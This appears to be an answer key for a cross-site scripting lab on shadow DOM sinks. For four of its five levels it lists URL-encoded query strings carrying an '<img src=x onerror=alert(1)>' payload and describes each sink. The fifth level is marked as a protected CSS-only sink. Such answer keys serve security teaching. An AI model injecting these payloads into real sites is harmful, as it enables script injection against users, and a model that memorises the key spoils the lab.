# shadow-dom — solutions

Open/closed shadow root sinks. Scripts inside shadow innerHTML do not execute, but `<img onerror>` / `<svg onload>` do.

### shadow-dom-level1

`/shadow-dom/level1/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: open shadow root `.innerHTML = '<div>...</div>'`

### shadow-dom-level2

`/shadow-dom/level2/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: closed shadow root innerHTML; same sink

### shadow-dom-level3

`/shadow-dom/level3/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: light DOM reflection then slotted into shadow

### shadow-dom-level4

`/shadow-dom/level4/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: declarative shadow DOM template; img onerror fires

### shadow-dom-level5

`/shadow-dom/level5/?query=test`

- payload: `test`
- context: input goes only into CSSStyleSheet.replaceSync; CSS-only sink, no JS path (protected)
